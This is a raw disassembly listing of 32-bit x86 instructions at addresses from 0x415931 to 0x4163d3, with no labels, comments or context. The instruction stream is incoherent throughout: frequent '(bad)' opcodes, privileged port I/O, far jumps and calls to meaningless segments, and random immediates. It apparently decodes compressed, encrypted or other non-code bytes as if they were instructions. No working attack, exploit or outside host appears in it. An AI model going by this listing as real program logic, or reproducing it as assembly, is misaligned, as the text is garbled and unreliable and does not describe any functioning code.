  415931:	dec    edx
  415932:	dec    esp
  415933:	enter  0x3cda,0xbc
  415937:	xchg   edi,eax
  415938:	popa   
  415939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41593a:	sub    BYTE PTR [edi+0x4c038db6],0x20
  415941:	add    BYTE PTR [ecx-0x35],0xb7
  415945:	cmp    BYTE PTR [ebx+ebp*8],ah
  415948:	jb     0x415995
  41594a:	aas    
  41594b:	cmp    al,0x5
  41594d:	mov    eax,ds:0x38a3502b
  415952:	aam    0x20
  415954:	rol    ah,0xfc
  415957:	inc    esp
  415958:	pop    esi
  415959:	(bad)  
  41595b:	sbb    al,0x76
  41595d:	and    al,0xa3
  41595f:	test   al,0xed
  415961:	loop   0x4159a8
  415963:	fwait
  415964:	clc    
  415965:	out    dx,eax
  415966:	outs   dx,BYTE PTR ds:[esi]
  415967:	cs mov ah,0xcc
  41596a:	(bad)  
  41596c:	add    ecx,esp
  41596e:	push   edi
  41596f:	mov    DWORD PTR [esi],edi
  415971:	xor    al,0x49
  415973:	xor    al,0x2
  415975:	adc    al,0x91
  415977:	in     eax,0x61
  415979:	mov    dl,0x60
  41597b:	xor    ch,al
  41597d:	jmp    0x4159c5
  41597f:	push   edx
  415980:	rol    BYTE PTR [ebp+0x6e],1
  415983:	mov    dh,0xe4
  415985:	cld    
  415986:	dec    esi
  415987:	push   ss
  415988:	sar    DWORD PTR [eax+0xb837ddd],1
  41598e:	aad    0xb9
  415990:	xchg   BYTE PTR [eax],al
	...
  4159f2:	add    BYTE PTR [eax],al
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	out    dx,al
  415a01:	add    BYTE PTR ds:[edx+0x36],dl
  415a05:	in     al,0x0
  415a07:	add    BYTE PTR ds:0xc4000001,al
  415a0d:	lea    ebx,[edi]
  415a0f:	mov    dh,0xa7
  415a11:	or     eax,0x60772759
  415a16:	mov    WORD PTR [esi],ds
  415a18:	iret   
  415a19:	cmp    dh,dh
  415a1b:	or     eax,DWORD PTR [ebx+0x63]
  415a1e:	mov    eax,0xbd50eef4
  415a23:	iret   
  415a24:	or     ch,BYTE PTR [esi]
  415a26:	mov    ecx,0xcd92d1f0
  415a2b:	inc    ebx
  415a2c:	aad    0x4c
  415a2e:	into   
  415a2f:	test   al,0x26
  415a31:	push   esp
  415a32:	les    ecx,FWORD PTR [eax]
  415a34:	cs inc esi
  415a36:	add    edi,DWORD PTR ds:0xa92f59ff
  415a3c:	or     edx,DWORD PTR [ebx-0x15]
  415a3f:	mov    al,bh
  415a41:	jno    0x4159cc
  415a43:	dec    ebx
  415a44:	sbb    ah,BYTE PTR [ecx+0x4d]
  415a47:	aas    
  415a48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a49:	ss cmp dh,dh
  415a4c:	imul   eax,DWORD PTR [ebp-0x736e859f],0xe8bc3a72
  415a56:	out    dx,eax
  415a57:	and    bh,al
  415a59:	(bad)  
  415a5a:	push   ds
  415a5b:	mov    ebp,0xb42e6bbf
  415a60:	sub    BYTE PTR [eax-0x5bd4613a],dl
  415a66:	adc    ch,ch
  415a68:	aam    0xb6
  415a6a:	xor    esi,ebx
  415a6c:	mov    ecx,0x5e34a71b
  415a71:	jecxz  0x415a82
  415a73:	mov    ebx,0xa03d2031
  415a78:	or     edi,DWORD PTR [edi+eiz*8-0x26]
  415a7c:	bsf    ecx,esp
  415a7f:	enter  0x738,0x46
  415a83:	mov    al,ds:0xa18f360c
  415a88:	xchg   ebx,eax
  415a89:	add    eax,0x1d07857b
  415a8e:	fbld   TBYTE PTR [esi-0x4e]
  415a91:	mov    eax,ds:0x538059bc
  415a96:	(bad)  
  415a97:	int3   
  415a98:	and    eax,0xb1bfbdad
  415a9d:	(bad)  
  415a9f:	mov    edi,0xfa15b84c
  415aa4:	sti    
  415aa5:	sbb    eax,esi
  415aa7:	mov    eax,ds:0xa3f408b
  415aac:	sub    al,0x2f
  415aae:	dec    ebx
  415aaf:	cmp    DWORD PTR [eax+0x2d10e1dd],esi
  415ab5:	dec    ecx
  415ab6:	cmp    eax,0xd603a77b
  415abb:	push   edx
  415abc:	into   
  415abd:	cmp    DWORD PTR [ecx+eax*8+0xa],esp
  415ac1:	in     al,dx
  415ac2:	adc    al,0x58
  415ac4:	push   ss
  415ac5:	test   al,0xdd
  415ac7:	mov    edi,0xc5d5f88
  415acc:	loop   0x415b0f
  415ace:	je     0x415a5e
  415ad0:	jae    0x415b31
  415ad2:	add    bh,ah
  415ad4:	mov    BYTE PTR [edx],al
  415ad6:	xlat   BYTE PTR ds:[ebx]
  415ad7:	lds    esp,FWORD PTR [esi+esi*1+0x29f726a0]
  415ade:	mov    WORD PTR [ebx+0x32],ss
  415ae1:	enter  0x79f3,0xdf
  415ae5:	inc    ebx
  415ae6:	cmp    BYTE PTR [edx],bl
  415ae8:	or     eax,0x16c12ad9
  415aed:	rcr    DWORD PTR [eax+0x59b1102b],0x6f
  415af4:	push   ebx
  415af5:	dec    ecx
  415af6:	out    0xf3,eax
  415af8:	jl     0x415abc
  415afa:	ins    BYTE PTR es:[edi],dx
  415afb:	fld    TBYTE PTR [eax-0x4d496c54]
  415b01:	jno    0x415b0b
  415b03:	mov    bl,0x62
  415b05:	sub    esp,esi
  415b07:	out    0x78,al
  415b09:	mov    DWORD PTR [eax],0x94ce22bd
  415b0f:	adc    DWORD PTR [ebx+0x0],edi
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fsub   QWORD PTR [ebp+0x3b07ba4d]
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR ds:0x60000001,al
  415b8d:	add    DWORD PTR ds:0x22da7474,edx
  415b93:	or     dh,BYTE PTR [edi-0x7166e629]
  415b99:	js     0x415b60
  415b9b:	pcmpeqb mm3,QWORD PTR [ebp-0x52020056]
  415ba2:	mov    edi,0xd74e777d
  415ba7:	(bad)  
  415ba8:	hlt    
  415ba9:	cmc    
  415baa:	cmp    DWORD PTR [edi-0x59eda0d8],0x44b39180
  415bb4:	inc    ebx
  415bb5:	shl    DWORD PTR [edx+edx*2+0x34],1
  415bb9:	sbb    eax,0xb215d8c7
  415bbe:	mov    ch,0xba
  415bc0:	sub    al,0x85
  415bc2:	jo     0x415bc9
  415bc4:	in     al,dx
  415bc5:	sbb    al,0xad
  415bc7:	retf   
  415bc8:	sbb    bl,BYTE PTR [eax-0x25]
  415bcb:	sub    DWORD PTR [edx+0xae68174],eax
  415bd1:	mov    dl,0x6b
  415bd3:	push   0x4459dc62
  415bd8:	fisubr WORD PTR [edx+0x5d]
  415bdb:	mov    eax,ds:0xecfa0517
  415be0:	mov    bh,0x69
  415be2:	repz pop esi
  415be4:	test   DWORD PTR [edx+0x55],edx
  415be7:	mov    ah,BYTE PTR [eax-0x3312bf46]
  415bed:	jo     0x415ba1
  415bef:	or     BYTE PTR [esi+0x28],0x72
  415bf3:	jmp    0x415c4c
  415bf5:	int    0xc1
  415bf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bf8:	pop    ss
  415bf9:	add    BYTE PTR [edi],0xc
  415bfc:	mov    ds:0xcc1bfb39,al
  415c01:	pusha  
  415c02:	add    DWORD PTR [esi+0x6c],edx
  415c05:	adc    eax,0xab798d4e
  415c0a:	gs imul ebp,DWORD PTR es:0x9595f758,0x57e0e5e5
  415c16:	test   eax,0x61cb8708
  415c1b:	call   0x7dd7:0xd26d08b2
  415c22:	stos   BYTE PTR es:[edi],al
  415c23:	retf   0xc431
  415c26:	or     al,BYTE PTR [edx+0x670f5d2c]
  415c2c:	retf   
  415c2d:	fdivr  DWORD PTR [edx+0x70]
  415c30:	pop    ebp
  415c31:	jno    0x415c4a
  415c33:	jne    0x415bd6
  415c35:	in     al,dx
  415c36:	mov    esi,0x8ae580e6
  415c3b:	or     edx,ebx
  415c3d:	xchg   esp,eax
  415c3e:	xor    eax,0xa5c7d769
  415c43:	or     eax,0x83ccec26
  415c48:	in     eax,dx
  415c49:	xor    edx,esi
  415c4b:	mov    ch,0x3e
  415c4d:	lahf   
  415c4e:	lahf   
  415c4f:	fstp   DWORD PTR [edx]
  415c51:	and    dh,dh
  415c53:	sub    ebp,DWORD PTR [ebx-0x4ad0f61a]
  415c59:	add    dh,bl
  415c5b:	into   
  415c5c:	es loop 0x415c00
  415c5f:	adc    al,BYTE PTR [esi+0x47]
  415c62:	nop
  415c63:	imul   ecx,edi,0x708c57fd
  415c69:	idiv   esp
  415c6b:	xchg   esp,eax
  415c6c:	or     bl,BYTE PTR [ebx]
  415c6e:	clc    
  415c6f:	not    eax
  415c71:	jne    0x415ca0
  415c73:	adc    ebp,DWORD PTR [edx+0x6694f63d]
  415c79:	sub    BYTE PTR [eax+esi*4+0x4488c7a2],bh
  415c80:	dec    ebp
  415c81:	xchg   esp,eax
  415c82:	jmp    0x6e03:0x29f18d9a
  415c89:	and    BYTE PTR [ebp-0x5a626050],bh
  415c8f:	leave  
  415c90:	int    0x0
	...
  415cf2:	add    BYTE PTR [eax],al
  415cf4:	cmp    dl,BYTE PTR [eax]
  415cf6:	mov    edi,0xbbbfbf3c
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x1ac2761f
  415d03:	clc    
  415d04:	inc    eax
  415d05:	out    0x0,al
  415d07:	add    BYTE PTR ds:0xb000001,al
  415d0d:	mov    esp,0x589f7c10
  415d12:	xor    al,0xef
  415d14:	inc    esi
  415d15:	lahf   
  415d16:	xor    al,0x19
  415d18:	fnstcw WORD PTR [eax]
  415d1a:	dec    DWORD PTR [esi-0x79b88751]
  415d20:	xor    al,0xa5
  415d22:	dec    edi
  415d23:	ds pop esi
  415d25:	loopne 0x415d8f
  415d27:	pop    esi
  415d28:	lock (bad) 
  415d2a:	mov    ch,0xeb
  415d2c:	add    eax,0xd13dd104
  415d31:	mov    cl,cl
  415d33:	sub    BYTE PTR [ebp+0x23dd0e41],dl
  415d39:	dec    esp
  415d3a:	xchg   esi,eax
  415d3b:	sub    ch,dl
  415d3d:	ja     0x415d66
  415d3f:	mov    al,0x71
  415d41:	pushf  
  415d42:	inc    ebp
  415d43:	pop    esp
  415d44:	test   DWORD PTR [ebp+0x71ea48d5],0xda23957f
  415d4e:	out    0x86,eax
  415d50:	ins    DWORD PTR es:[edi],dx
  415d51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d52:	mov    DWORD PTR [edx],ecx
  415d54:	and    eax,0x2230b25d
  415d59:	fnstenv [ebx]
  415d5b:	int    0xd9
  415d5d:	xor    BYTE PTR [edx+0x0],0x4d
  415d61:	imul   esi,DWORD PTR ds:0xd85101d0,0x8574c6e0
  415d6b:	xlat   BYTE PTR ds:[ebx]
  415d6c:	and    DWORD PTR ds:0xac943b7b,esi
  415d72:	add    al,0xd3
  415d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d75:	push   esp
  415d76:	sub    al,0xbe
  415d78:	lea    eax,[ebx+0x0]
  415d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d7c:	or     ah,dl
  415d7e:	in     eax,0x23
  415d80:	test   eax,0x4ee32285
  415d85:	jno    0x415dfd
  415d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d88:	mov    DWORD PTR [eax],0x2b78a62f
  415d8e:	jl     0x415dc7
  415d90:	and    al,0x1b
  415d92:	add    cl,BYTE PTR [esi+0x26b0743]
  415d98:	ror    DWORD PTR [edx-0x1cd8369d],cl
  415d9e:	add    al,0x2d
  415da0:	xlat   BYTE PTR ds:[ebx]
  415da1:	sti    
  415da2:	mov    edi,0x5d5b1def
  415da7:	rcl    DWORD PTR es:[ebx+ebx*2-0x60e8671b],1
  415daf:	(bad)  
  415db0:	retf   0x8ff1
  415db3:	lahf   
  415db4:	ins    DWORD PTR es:[edi],dx
  415db5:	and    DWORD PTR [edx-0x39],esi
  415db8:	call   0x236f:0x8461bedd
  415dbf:	adc    DWORD PTR [edx],0x7f
  415dc2:	mov    eax,ds:0xf8540bf3
  415dc7:	es pop edx
  415dc9:	sahf   
  415dca:	xchg   ebp,eax
  415dcb:	nop
  415dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dce:	mov    ebx,0x3730e824
  415dd3:	arpl   WORD PTR [edx],bp
  415dd5:	imul   eax,DWORD PTR [ebx+0x5e],0xe7d359aa
  415ddc:	and    eax,0xf5605300
  415de1:	or     al,0x21
  415de3:	sub    eax,0x263c2d5d
  415de8:	pop    esp
  415de9:	test   BYTE PTR [edx],cl
  415deb:	pop    edx
  415dec:	xor    al,0x17
  415dee:	jnp    0x415e10
  415df0:	pop    es
  415df1:	xchg   ecx,eax
  415df2:	dec    edx
  415df3:	jp     0x415d8c
  415df5:	inc    eax
  415df6:	push   cs
  415df7:	mov    eax,0xc2827188
  415dfc:	sar    DWORD PTR [ecx+0x4d2bd512],1
  415e02:	ja     0x415e34
  415e04:	loop   0x415dc4
  415e06:	dec    esp
  415e07:	arpl   WORD PTR [ebx+eiz*8],bp
  415e0a:	push   cs
  415e0b:	mov    esp,0x2580e2a4
  415e10:	test   DWORD PTR [eax],eax
	...
  415e72:	add    BYTE PTR [eax],al
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x61]
  415e81:	push   ebp
  415e82:	fdivr  DWORD PTR [edi]
  415e84:	inc    ebp
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR ds:0xf8000001,al
  415e8d:	out    dx,eax
  415e8e:	arpl   WORD PTR [ebx-0x7a],bp
  415e91:	adc    DWORD PTR [ebx],edx
  415e93:	push   ds
  415e94:	xchg   ebp,eax
  415e95:	xor    DWORD PTR [ebx+0x5dc6bae9],edx
  415e9b:	xchg   edi,eax
  415e9c:	outs   dx,DWORD PTR ds:[esi]
  415e9d:	popf   
  415e9e:	not    BYTE PTR [ebx+0x7d]
  415ea1:	add    cl,BYTE PTR [edi]
  415ea3:	inc    eax
  415ea4:	xchg   ebx,eax
  415ea5:	gs loope 0x415e69
  415ea8:	lea    ecx,[edx+0x5b]
  415eab:	mov    ebx,0x9a342914
  415eb0:	mov    WORD PTR [edi+0x6daeff2],fs
  415eb6:	adc    ecx,DWORD PTR [ebp-0x50]
  415eb9:	cmc    
  415eba:	add    al,0x4a
  415ebc:	jle    0x415e84
  415ebe:	dec    ecx
  415ebf:	scas   eax,DWORD PTR es:[edi]
  415ec0:	xchg   DWORD PTR [eax],eax
  415ec2:	arpl   WORD PTR es:[esi-0x45bbc09d],si
  415ec9:	ds mov bl,0x4b
  415ecc:	pop    ss
  415ecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ece:	and    DWORD PTR [eax],edx
  415ed0:	jae    0x415e5f
  415ed2:	sahf   
  415ed3:	mov    cl,0x24
  415ed5:	sbb    esp,edi
  415ed7:	je     0x415e9d
  415ed9:	fabs   
  415edb:	retf   0x1806
  415ede:	sbb    dh,BYTE PTR [edi-0x481dc51e]
  415ee4:	and    BYTE PTR [eax-0x2a],ah
  415ee7:	cdq    
  415ee8:	fst    QWORD PTR [edx-0x30]
  415eeb:	in     eax,dx
  415eec:	xor    cl,BYTE PTR ss:[esi-0x6791b38b]
  415ef3:	cmc    
  415ef4:	shl    BYTE PTR [esi-0x3bacb940],0x5a
  415efb:	int3   
  415efc:	or     DWORD PTR [esi+0x68],esp
  415eff:	mov    dl,0xa4
  415f01:	dec    esp
  415f02:	sub    eax,0xccc217c8
  415f07:	mov    ebp,0x425d5c5f
  415f0c:	push   edi
  415f0d:	sti    
  415f0e:	push   eax
  415f0f:	jbe    0x415ec8
  415f11:	push   edx
  415f12:	(bad)  
  415f13:	call   esp
  415f15:	pop    eax
  415f16:	dec    edx
  415f17:	adc    BYTE PTR [ebp-0x7e3028d8],al
  415f1d:	jl     0x415f37
  415f1f:	mov    dh,0x56
  415f21:	jmp    0x8130:0xfca65cfd
  415f28:	dec    eax
  415f29:	sbb    DWORD PTR [ebp-0x10dc207d],esp
  415f2f:	pop    es
  415f30:	test   al,0x7a
  415f32:	mov    BYTE PTR [ebp+ebx*4-0x51],al
  415f36:	fucomp st(2)
  415f38:	in     eax,dx
  415f39:	xor    al,0x2a
  415f3b:	(bad)  
  415f3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f3d:	add    edi,DWORD PTR [eax+0x39]
  415f40:	jge    0x415f98
  415f42:	mov    edx,DWORD PTR [ecx+0x1e]
  415f45:	int    0xcc
  415f47:	xor    DWORD PTR [ebx+0x6b99adc8],ebp
  415f4d:	mov    eax,ds:0x199ea4d6
  415f52:	popf   
  415f53:	mov    al,ds:0x49b666d8
  415f58:	fwait
  415f59:	icebp  
  415f5a:	add    edx,DWORD PTR [edi-0x15]
  415f5d:	cmp    BYTE PTR [ebx+0x78d83b55],dl
  415f63:	sub    eax,0x8c8fb013
  415f68:	xchg   ecx,eax
  415f69:	push   0x60
  415f6b:	jnp    0x415f52
  415f6d:	sub    eax,0x69d52681
  415f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f73:	push   ebp
  415f74:	enter  0x28e7,0x2f
  415f78:	adc    edx,DWORD PTR [ecx]
  415f7a:	(bad)  
  415f7b:	in     al,0x68
  415f7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f7e:	xchg   DWORD PTR [edx+0x27],edi
  415f81:	and    BYTE PTR [eax+ecx*2-0x76d3cc59],bl
  415f88:	sbb    eax,0xb0075c9a
  415f8d:	and    esi,esp
  415f8f:	(bad)  
  415f90:	jmp    0x0:0x0
	...
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	shl    BYTE PTR [ecx-0x17b51316],0x0
  416007:	add    BYTE PTR ds:0xdb000001,al
  41600d:	jbe    0x41608a
  41600f:	aaa    
  416010:	xor    ebp,DWORD PTR [eax+eiz*2]
  416013:	inc    esi
  416014:	ret    
  416015:	jmp    0xaf15:0x1207e2a6
  41601c:	jb     0x415ffd
  41601e:	test   eax,0x612ea4d1
  416023:	bound  esi,QWORD PTR [ecx-0x43]
  416026:	cld    
  416027:	cmp    dl,BYTE PTR [ecx]
  416029:	das    
  41602a:	rol    DWORD PTR [eax+eax*8-0x70],cl
  41602e:	out    dx,al
  41602f:	fisttp QWORD PTR [ecx-0x7a]
  416032:	fdivr  QWORD PTR [eax+0x105d978]
  416038:	add    eax,0xe108716f
  41603d:	pop    eax
  41603e:	arpl   WORD PTR [edx-0x6],di
  416041:	shr    BYTE PTR [ebx],cl
  416043:	ins    BYTE PTR es:[edi],dx
  416044:	and    al,BYTE PTR [di]
  416047:	sahf   
  416048:	leave  
  416049:	pop    eax
  41604a:	mov    bl,0xbf
  41604c:	and    DWORD PTR [esp+eiz*8+0x1310c2eb],ebp
  416053:	test   BYTE PTR [ebx],al
  416055:	xchg   esp,ebx
  416057:	(bad)  
  416059:	add    DWORD PTR [ebx+0x1e2f9dd4],0x1602d3ad
  416063:	pop    ecx
  416064:	add    dh,BYTE PTR [esi-0x5d5b4fd9]
  41606a:	jnp    0x41608c
  41606c:	xor    bh,bl
  41606e:	or     al,0x99
  416070:	push   ds
  416071:	push   esi
  416072:	loop   0x4160b8
  416074:	jns    0x4160da
  416076:	leave  
  416077:	into   
  416078:	mov    al,ds:0xe7391f43
  41607d:	retf   0xea91
  416080:	dec    edi
  416081:	call   0x833e:0xf36ffb45
  416088:	lock add ecx,DWORD PTR [ebp+0x37]
  41608c:	push   ss
  41608d:	loopne 0x4160ee
  41608f:	sub    cl,BYTE PTR [edx]
  416091:	sub    al,0x32
  416093:	es mov ?,ecx
  416096:	sub    al,0xe0
  416098:	jge    0x416077
  41609a:	call   0x2a:0xb7faf15e
  4160a1:	sbb    BYTE PTR [edi+0x43f6dee3],bl
  4160a7:	adc    al,0x74
  4160a9:	xlat   BYTE PTR ds:[ebx]
  4160aa:	cbw    
  4160ac:	ins    DWORD PTR es:[edi],dx
  4160ad:	ins    DWORD PTR es:[edi],dx
  4160ae:	out    dx,al
  4160af:	loopne 0x41605e
  4160b1:	in     al,0x92
  4160b3:	jg     0x4160eb
  4160b5:	add    al,0x9e
  4160b7:	or     DWORD PTR [ebx-0x50],edx
  4160ba:	jl     0x41610d
  4160bc:	adc    al,0x8
  4160be:	dec    ebx
  4160bf:	mov    al,ds:0x58037a93
  4160c4:	adc    esp,ebx
  4160c6:	mov    cl,0x32
  4160c8:	or     al,0xd7
  4160ca:	push   es
  4160cb:	push   edi
  4160cc:	or     BYTE PTR [eax+0x20928b39],bl
  4160d2:	dec    ebx
  4160d3:	test   eax,0xfb396bc9
  4160d8:	jb     0xb870c516
  4160de:	ficomp DWORD PTR ds:0xae0b5f52
  4160e4:	sub    al,0x37
  4160e6:	sub    al,0x8b
  4160e8:	shr    DWORD PTR [ebx],1
  4160ea:	inc    edi
  4160eb:	or     edx,edx
  4160ed:	and    edx,DWORD PTR ds:0xcde36d71
  4160f3:	cli    
  4160f4:	and    BYTE PTR [ecx],0x80
  4160f7:	dec    ebp
  4160f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160f9:	bound  esi,QWORD PTR ds:[esi+0x4d29c49e]
  416100:	div    DWORD PTR [ecx]
  416102:	daa    
  416103:	jb     0x4160b7
  416105:	mov    esi,0x4efb0f69
  41610a:	repz in al,0x73
  41610d:	mov    dl,0x11
  41610f:	sub    al,BYTE PTR [edx+0x0]
	...
  416171:	add    BYTE PTR [eax],al
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0x3ef070f3
  416183:	mov    ds:0xe94f,al
  416188:	add    eax,0x3b000001
  41618d:	sbb    al,0x84
  41618f:	add    eax,DWORD PTR [edx-0x36]
  416192:	and    al,0xc1
  416194:	push   ss
  416195:	shr    esp,cl
  416197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416198:	das    
  416199:	mov    dl,0x14
  41619b:	sub    esi,DWORD PTR [ebp-0x1f68507f]
  4161a1:	inc    edx
  4161a2:	pop    ds
  4161a3:	xor    esp,DWORD PTR [edi]
  4161a5:	push   es
  4161a6:	xchg   edx,eax
  4161a7:	inc    ebx
  4161a8:	xchg   ecx,eax
  4161a9:	push   esp
  4161aa:	xchg   edx,eax
  4161ab:	in     eax,dx
  4161ac:	and    ecx,DWORD PTR [eax+0x6b20c083]
  4161b2:	jnp    0x41613a
  4161b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161b5:	mov    esp,0x24dff217
  4161ba:	xor    BYTE PTR [edi-0xb9d9257],bh
  4161c0:	rol    DWORD PTR [esi-0x20],cl
  4161c3:	xchg   BYTE PTR [edi+0x32],dh
  4161c6:	xor    DWORD PTR ds:0xffd92163,0x1756034c
  4161d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161d1:	cmp    al,0xf7
  4161d3:	xor    DWORD PTR [eax-0x7952d3],0x5716112
  4161dd:	call   0x76f67c7b
  4161e2:	popa   
  4161e3:	xor    eax,0x1bdff8dd
  4161e8:	arpl   ax,bp
  4161ea:	jg     0x4161db
  4161ec:	fistp  DWORD PTR [ebp-0x7761e009]
  4161f2:	jmp    0x4a1c:0x9939e8e7
  4161f9:	push   esp
  4161fa:	pop    ebx
  4161fb:	push   0x61
  4161fd:	jecxz  0x416207
  4161ff:	jecxz  0x416258
  416201:	jbe    0x416237
  416203:	xchg   BYTE PTR [eax+0x2e8a305e],al
  416209:	scas   al,BYTE PTR es:[edi]
  41620a:	mov    edi,?
  41620c:	outs   dx,BYTE PTR ds:[esi]
  41620d:	push   edi
  41620e:	sub    al,0xa
  416210:	add    eax,0x390361c0
  416215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416216:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416218:	outs   dx,BYTE PTR ds:[esi]
  416219:	and    eax,0x87ea1dcf
  41621e:	mov    ebx,0x5228170b
  416223:	push   esi
  416224:	push   esp
  416225:	lahf   
  416226:	xor    edi,DWORD PTR [ebp+0x1f]
  416229:	mov    eax,0x4c286929
  41622e:	fistp  QWORD PTR [eax+0x7f87ec83]
  416234:	ret    0xd942
  416237:	cli    
  416238:	jl     0x416292
  41623a:	fbld   TBYTE PTR [eax-0x22cbf60e]
  416240:	adc    ah,ch
  416242:	loope  0x416270
  416244:	pop    ds
  416245:	scas   al,BYTE PTR es:[edi]
  416246:	clc    
  416247:	sub    DWORD PTR [edi-0x5297b89b],esp
  41624d:	loop   0x416214
  41624f:	push   esp
  416250:	push   ss
  416251:	sub    DWORD PTR [edx],ebp
  416253:	dec    edx
  416254:	add    ah,al
  416256:	cdq    
  416257:	xor    DWORD PTR [ebx+0x376c360d],edi
  41625d:	stos   BYTE PTR es:[edi],al
  41625e:	call   0xc5a0:0x853b4095
  416265:	jne    0x416212
  416267:	int    0x33
  416269:	fistp  DWORD PTR [edx-0x6ecf250b]
  41626f:	cli    
  416270:	ins    BYTE PTR es:[edi],dx
  416271:	cs or  ebx,edx
  416274:	mov    ds:0x74392a3a,al
  416279:	jle    0x41626f
  41627b:	ss leave 
  41627d:	cmc    
  41627e:	data16 mov bl,0x20
  416281:	pop    esi
  416282:	clc    
  416283:	int3   
  416284:	mov    esp,0xb5f20ca1
  416289:	fisub  DWORD PTR [eax+0x326418ec]
  41628f:	test   DWORD PTR [ecx],ecx
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x540a:0xa2084cee
  416305:	jmp    0x0:0x1050000
  41630c:	push   0x27e9922e
  416311:	pushf  
  416312:	scas   al,BYTE PTR es:[edi]
  416313:	cdq    
  416314:	jae    0x41629d
  416316:	aas    
  416317:	pop    eax
  416318:	mov    dl,0xb
  41631a:	scas   eax,DWORD PTR es:[edi]
  41631b:	pop    ds
  41631c:	ror    DWORD PTR [eax+0x47a5c0b8],0x11
  416323:	or     al,dl
  416325:	mov    dl,0x6e
  416327:	pop    esi
  416328:	pop    ss
  416329:	mov    dh,0x9c
  41632b:	out    0xdf,al
  41632d:	mov    BYTE PTR [edi],0xea
  416330:	mov    al,0x8d
  416332:	js     0x4162d6
  416334:	push   es
  416335:	ins    BYTE PTR es:[edi],dx
  416336:	cmp    bh,bh
  416338:	xor    al,0x66
  41633a:	stc    
  41633b:	push   eax
  41633c:	add    edi,DWORD PTR [eax]
  41633e:	jno    0x416360
  416340:	push   0x46
  416342:	int    0xb5
  416344:	and    ebp,DWORD PTR [ebx]
  416346:	cwde   
  416347:	cld    
  416348:	cli    
  416349:	pop    esi
  41634a:	data16 stc 
  41634c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41634d:	(bad)  
  41634e:	cmp    DWORD PTR [esi],eax
  416350:	repnz push ebx
  416352:	shl    BYTE PTR [eax-0xab9fba8],cl
  416358:	mov    ebp,0x5fdb019a
  41635d:	or     cl,cl
  41635f:	jmp    0x4162e3
  416361:	aaa    
  416362:	adc    eax,0x41072bbb
  416367:	xchg   cl,bl
  416369:	sub    al,0xc5
  41636b:	popf   
  41636c:	repnz xor ah,BYTE PTR [ecx+0x57fe442f]
  416373:	xchg   ebx,eax
  416374:	cmp    DWORD PTR [edx],ebx
  416376:	or     edx,DWORD PTR ds:0x3c3246df
  41637c:	ins    BYTE PTR es:[edi],dx
  41637d:	fsubr  st(3),st
  41637f:	pop    esi
  416380:	adc    dl,BYTE PTR [ebp+ecx*2+0x14]
  416384:	je     0x416331
  416386:	jae    0x4163c1
  416388:	fcomp  QWORD PTR [edi+esi*2]
  41638b:	inc    esi
  41638c:	or     eax,0xac1c2c55
  416391:	cs icebp 
  416393:	push   0x65
  416395:	int3   
  416396:	test   al,0x43
  416398:	add    esp,DWORD PTR [edx]
  41639a:	cs popf 
  41639c:	jmp    0x4163b6
  41639e:	pop    ebx
  41639f:	rcr    DWORD PTR [ebx-0x76],cl
  4163a2:	pop    ds
  4163a3:	dec    edx
  4163a4:	sbb    edx,DWORD PTR [eax-0x2b6230a7]
  4163aa:	sar    DWORD PTR [edi-0x32684de6],1
  4163b0:	jnp    0x4163f9
  4163b2:	ss cmpxchg bh,bl
  4163b6:	push   esp
  4163b7:	and    bl,BYTE PTR [eax+ebp*4+0x695ebf1d]
  4163be:	cwde   
  4163bf:	sbb    eax,0xddb7e67c
  4163c4:	add    edx,DWORD PTR [edi-0x75]
  4163c7:	test   DWORD PTR es:[eax+edi*4],esi
  4163cb:	mov    fs,ebp
  4163cd:	scas   eax,DWORD PTR es:[edi]
  4163ce:	xchg   edx,eax
  4163cf:	ret    0xb9ec
  4163d2:	popa   
  4163d3:	lea    eax,[edi+0x2a]
